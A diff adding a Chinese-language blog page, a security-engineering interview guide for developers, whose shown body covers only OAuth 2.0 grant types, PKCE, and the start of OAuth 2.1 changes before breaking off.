@@ -1,0 +1,2006 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"liuerge.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":true,"preload":true}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="安全工程面试全解 面向全栈资深研发的安全知识体系，非安全专家视角，聚焦全栈研发必须掌握的安全工程能力。   0x00 认证与授权Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？标准答案 OAuth 2.0 定义了四种授权模式：  授权码模式（Authorization Code Grant）：最推荐的方式。客户端将用户重定向到授权服务器，用户认证后授权服务器返回授权码，客户端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全面试题：安全工程面试全解">
+<meta property="og:url" content="https://liuerge.github.io/2026/06/13/%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98-%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:site_name" content="xiaoxin1024&#39;s Blog">
+<meta property="og:description" content="安全工程面试全解 面向全栈资深研发的安全知识体系，非安全专家视角，聚焦全栈研发必须掌握的安全工程能力。   0x00 认证与授权Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？标准答案 OAuth 2.0 定义了四种授权模式：  授权码模式（Authorization Code Grant）：最推荐的方式。客户端将用户重定向到授权服务器，用户认证后授权服务器返回授权码，客户端">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-13T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-13T06:35:47.071Z">
+<meta property="article:author" content="xiaoxin1024">
+<meta property="article:tag" content="API安全">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="OAuth">
+<meta property="article:tag" content="OWASP">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="面试题">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://liuerge.github.io/2026/06/13/%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98-%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://liuerge.github.io/2026/06/13/%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98-%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/","path":"2026/06/13/安全面试题-安全工程-面试全解/","title":"安全面试题：安全工程面试全解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>安全面试题：安全工程面试全解 | xiaoxin1024's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+<meta name="baiduspider" content="noindex, nofollow" />
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">xiaoxin1024's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">the life i want，there is not shortcut.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3"><span class="nav-text">安全工程面试全解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83"><span class="nav-text">0x00 认证与授权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q1%EF%BC%9AOAuth-2-0-%E6%9C%89%E5%93%AA%E5%9B%9B%E7%A7%8D%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%9FPKCE-%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="nav-text">Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q2%EF%BC%9AOAuth-2-1-%E7%9B%B8%E6%AF%94-2-0-%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%8F%98%E5%8C%96%EF%BC%9F"><span class="nav-text">Q2：OAuth 2.1 相比 2.0 有哪些关键变化？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q3%EF%BC%9AOIDC%EF%BC%88OpenID-Connect%EF%BC%89%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%92%8C-OAuth-2-0-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9F"><span class="nav-text">Q3：OIDC（OpenID Connect）是什么？和 OAuth 2.0 的关系？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q4%EF%BC%9AJWT-%E7%9A%84%E7%BB%93%E6%9E%84%E3%80%81%E7%AD%BE%E5%90%8D%E3%80%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%94%9F%E4%BA%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="nav-text">Q4：JWT 的结构、签名、常见漏洞及生产最佳实践</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q5%EF%BC%9ASession-vs-JWT-%E9%80%89%E5%9E%8B%E5%86%B3%E7%AD%96%E6%A0%91"><span class="nav-text">Q5：Session vs JWT 选型决策树</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q6%EF%BC%9ASAML-2-0-vs-OAuth-2-0-vs-OIDC-%E5%AF%B9%E6%AF%94"><span class="nav-text">Q6：SAML 2.0 vs OAuth 2.0 vs OIDC 对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q7%EF%BC%9ASSO-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%EF%BC%88CAS-SAML-OIDC%EF%BC%89"><span class="nav-text">Q7：SSO 实现原理（CAS &#x2F; SAML &#x2F; OIDC）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%9D%83%E9%99%90%E6%A8%A1%E5%9E%8B"><span class="nav-text">0x01 权限模型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q8%EF%BC%9ARBAC%EF%BC%88Role-Based-Access-Control%EF%BC%89%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E4%BD%93"><span class="nav-text">Q8：RBAC（Role-Based Access Control）核心概念和变体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q9%EF%BC%9AABAC%EF%BC%88Attribute-Based-Access-Control%EF%BC%89%E4%B8%8E-RBAC-%E5%AF%B9%E6%AF%94"><span class="nav-text">Q9：ABAC（Attribute-Based Access Control）与 RBAC 对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q10%EF%BC%9AACL-vs-RBAC-vs-ABAC-%E9%80%89%E5%9E%8B%E5%AF%B9%E6%AF%94"><span class="nav-text">Q10：ACL vs RBAC vs ABAC 选型对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q11%EF%BC%9ACasbin-%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%BA%93"><span class="nav-text">Q11：Casbin 轻量级权限管理库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Web-%E5%AE%89%E5%85%A8%EF%BC%88OWASP-Top-10%EF%BC%89"><span class="nav-text">0x02 Web 安全（OWASP Top 10）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q12%EF%BC%9AXSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89%E7%B1%BB%E5%9E%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-text">Q12：XSS（跨站脚本攻击）类型与防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q13%EF%BC%9ACSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-text">Q13：CSRF（跨站请求伪造）与防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q14%EF%BC%9ASQL-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E5%85%A8%E9%9D%A2%E6%96%B9%E6%A1%88"><span class="nav-text">Q14：SQL 注入防御全面方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q15%EF%BC%9ASSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-text">Q15：SSRF（服务端请求伪造）攻击与防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q16%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-text">Q16：文件上传漏洞与防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q17%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Q17：不安全的反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-API-%E5%AE%89%E5%85%A8"><span class="nav-text">0x03 API 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q18%EF%BC%9AAPI-%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%EF%BC%9A%E4%BB%A4%E7%89%8C%E6%A1%B6%E3%80%81%E6%BC%8F%E6%A1%B6%E3%80%81%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3"><span class="nav-text">Q18：API 速率限制：令牌桶、漏桶、滑动窗口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q19%EF%BC%9AAPI-%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C%E4%B8%8E%E8%AF%B7%E6%B1%82%E7%AD%BE%E5%90%8D"><span class="nav-text">Q19：API 输入校验与请求签名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q20%EF%BC%9AAPI-%E5%B9%82%E7%AD%89%E6%80%A7%EF%BC%88Idempotency-Key%EF%BC%89"><span class="nav-text">Q20：API 幂等性（Idempotency-Key）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q21%EF%BC%9ACORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89"><span class="nav-text">Q21：CORS（跨域资源共享）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q22%EF%BC%9AGraphQL-%E5%AE%89%E5%85%A8"><span class="nav-text">Q22：GraphQL 安全</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%AF%86%E9%92%A5%E4%B8%8E%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86"><span class="nav-text">0x04 密钥与凭据管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q23%EF%BC%9A%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%88HashiCorp-Vault-AWS-KMS-%E6%9C%AC%E5%9C%B0%E6%96%B9%E6%A1%88%EF%BC%89"><span class="nav-text">Q23：密钥管理系统（HashiCorp Vault &#x2F; AWS KMS &#x2F; 本地方案）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q24%EF%BC%9ASecrets-%E8%BD%AE%E6%8D%A2%E7%AD%96%E7%95%A5%E4%B8%8E%E5%AE%9E%E8%B7%B5"><span class="nav-text">Q24：Secrets 轮换策略与实践</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q25%EF%BC%9A-env-%E5%AE%89%E5%85%A8%E5%92%8C%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86"><span class="nav-text">Q25：.env 安全和证书管理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8"><span class="nav-text">0x05 供应链安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q26%EF%BC%9ASBOM%EF%BC%88%E8%BD%AF%E4%BB%B6%E7%89%A9%E6%96%99%E6%B8%85%E5%8D%95%EF%BC%89%E4%B8%8E-CycloneDX-SPDX"><span class="nav-text">Q26：SBOM（软件物料清单）与 CycloneDX &#x2F; SPDX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q27%EF%BC%9A%E4%BE%9D%E8%B5%96%E6%89%AB%E6%8F%8F%EF%BC%88Dependabot-Snyk-Trivy%EF%BC%89"><span class="nav-text">Q27：依赖扫描（Dependabot &#x2F; Snyk &#x2F; Trivy）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q28%EF%BC%9ADocker-%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8"><span class="nav-text">Q28：Docker 镜像安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q29%EF%BC%9A%E8%BD%AF%E4%BB%B6%E7%AD%BE%E5%90%8D%EF%BC%88Sigstore-Cosign%EF%BC%89%E5%92%8C-Dependency-Confusion"><span class="nav-text">Q29：软件签名（Sigstore &#x2F; Cosign）和 Dependency Confusion</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8"><span class="nav-text">0x06 网络与基础设施安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q30%EF%BC%9ATLS-mTLS-%E5%8E%9F%E7%90%86"><span class="nav-text">Q30：TLS &#x2F; mTLS 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q31%EF%BC%9AHTTPS-%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="nav-text">Q31：HTTPS 证书验证过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q32%EF%BC%9AWAF%E3%80%81DDoS-%E9%98%B2%E5%BE%A1%E4%B8%8E%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84"><span class="nav-text">Q32：WAF、DDoS 防御与零信任架构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%94%9F%E4%BA%A7%E5%AE%9E%E6%88%98"><span class="nav-text">0x07 生产实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q33%EF%BC%9AJWT-alg-none-%E6%BC%8F%E6%B4%9E%E4%BA%8B%E6%95%85"><span class="nav-text">Q33：JWT alg&#x3D;none 漏洞事故</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q34%EF%BC%9ASSRF-%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E5%A4%B1%E9%99%B7"><span class="nav-text">Q34：SSRF 导致内网失陷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q35%EF%BC%9AAPI-%E6%9C%AA%E9%99%90%E6%B5%81%E5%AF%BC%E8%87%B4-DDoS-%E4%BA%8B%E6%95%85"><span class="nav-text">Q35：API 未限流导致 DDoS 事故</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Q36%EF%BC%9A%E4%BE%9D%E8%B5%96%E6%8A%95%E6%AF%92%E6%A1%88%E4%BE%8B-%E2%80%94%E2%80%94-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-text">Q36：依赖投毒案例 —— 供应链攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB"><span class="nav-text">参考资料汇总</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xiaoxin1024</p>
+  <div class="site-description" itemprop="description">大海里的一粒沙</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">112</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://liuerge.github.io/2026/06/13/%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98-%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B-%E9%9D%A2%E8%AF%95%E5%85%A8%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xiaoxin1024">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxin1024's Blog">
+      <meta itemprop="description" content="大海里的一粒沙">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="安全面试题：安全工程面试全解 | xiaoxin1024's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          安全面试题：安全工程面试全解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-06-13 12:00:00 / 修改时间：14:35:47" itemprop="dateCreated datePublished" datetime="2026-06-13T12:00:00+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="安全工程面试全解"><a href="#安全工程面试全解" class="headerlink" title="安全工程面试全解"></a>安全工程面试全解</h1><blockquote>
+<p>面向全栈资深研发的安全知识体系，非安全专家视角，聚焦全栈研发必须掌握的安全工程能力。</p>
+</blockquote>
+<hr>
+<h2 id="0x00-认证与授权"><a href="#0x00-认证与授权" class="headerlink" title="0x00 认证与授权"></a>0x00 认证与授权</h2><h3 id="Q1：OAuth-2-0-有哪四种授权模式？PKCE-解决了什么问题？"><a href="#Q1：OAuth-2-0-有哪四种授权模式？PKCE-解决了什么问题？" class="headerlink" title="Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？"></a>Q1：OAuth 2.0 有哪四种授权模式？PKCE 解决了什么问题？</h3><p><strong>标准答案</strong></p>
+<p>OAuth 2.0 定义了四种授权模式：</p>
+<ol>
+<li><strong>授权码模式（Authorization Code Grant）</strong>：最推荐的方式。客户端将用户重定向到授权服务器，用户认证后授权服务器返回授权码，客户端用授权码换取 access token。适用于有后端的 Web 应用。</li>
+<li><strong>隐式模式（Implicit Grant）</strong>：直接返回 access token（URL fragment），不经过授权码步骤。设计初衷是给纯前端 SPA 使用。<strong>已在 OAuth 2.1 中废弃。</strong></li>
+<li><strong>密码模式（Resource Owner Password Credentials Grant）</strong>：用户直接把用户名密码交给客户端，客户端用它们换取 token。<strong>已在 OAuth 2.1 中废弃。</strong></li>
+<li><strong>客户端凭证模式（Client Credentials Grant）</strong>：客户端用自己的凭证（client_id + client_secret）直接换取 token，无用户参与。适用于 M2M（机器对机器）场景。</li>
+</ol>
+<p><strong>PKCE（Proof Key for Code Exchange）</strong>：授权码模式的增强扩展。原始授权码模式假设客户端能安全保存 client_secret（机密客户端），但原生 App 或 SPA 无法做到。PKCE 的工作流程：</p>
+<ul>
+<li>客户端生成一个 <code>code_verifier</code>（随机字符串，43-128 字符）</li>
+<li>计算 <code>code_challenge = SHA256(code_verifier)</code>（或 plain）</li>
+<li>授权请求时附带 <code>code_challenge</code> 和 <code>code_challenge_method</code></li>
+<li>换取 token 时附带 <code>code_verifier</code>，授权服务器比对 hash</li>
+</ul>
+<p>即使攻击者截获了授权码，没有 <code>code_verifier</code> 也无法换取 token。<strong>PKCE 现在被 OAuth 2.1 要求对所有客户端类型强制使用。</strong></p>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>边界情况</strong>：PKCE 能否防止授权码注入（Authorization Code Injection）？可以。攻击者窃取授权码后，因为没有 <code>code_verifier</code>，无法完成 token 交换。但如果攻击者同时控制了客户端的 redirect_uri…则需要结合 Exact Redirect URI Matching 来防御。</li>
+<li><strong>OAuth 2.0 Security BCP（RFC 9700，2025年1月发布）</strong>：明确要求：所有授权码流程必须使用 PKCE，即使是机密客户端（有 client_secret 的也要用）。另外推荐 sender-constrained tokens 和 refresh token rotation。</li>
+<li><strong>密码模式为何危险</strong>：应用程序直接接触用户密码，存在存储风险；且密码模式不支持两步验证、SSO 等高级认证机制。攻击面全部集中在客户端。</li>
+<li><strong>隐式模式的问题</strong>：access token 出现在 URL 中，泄露给浏览器历史、Referer header、服务器日志。且无法做 refresh token，用户体验差。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>RFC 6749 - The OAuth 2.0 Authorization Framework</li>
+<li>RFC 7636 - Proof Key for Code Exchange (PKCE)</li>
+<li>RFC 9700 - OAuth 2.0 Security Best Current Practice (2025)</li>
+<li><a target="_blank" rel="noopener" href="https://oauth.net/2/pkce/">https://oauth.net/2/pkce/</a></li>
+</ul>
+<h3 id="Q2：OAuth-2-1-相比-2-0-有哪些关键变化？"><a href="#Q2：OAuth-2-1-相比-2-0-有哪些关键变化？" class="headerlink" title="Q2：OAuth 2.1 相比 2.0 有哪些关键变化？"></a>Q2：OAuth 2.1 相比 2.0 有哪些关键变化？</h3><p><strong>标准答案</strong></p>
+<p>OAuth 2.1 不是一个全新的协议，而是将多年来的安全实践整合为一个统一的规范，消除了 “需要交叉引用十几个 RFC 才能写出安全的 OAuth” 的问题。主要变化：</p>
+<ol>
+<li><strong>废弃隐式模式</strong>：<code>response_type=token</code> 完全移除。替代方案：SPA 使用授权码模式 + PKCE。</li>
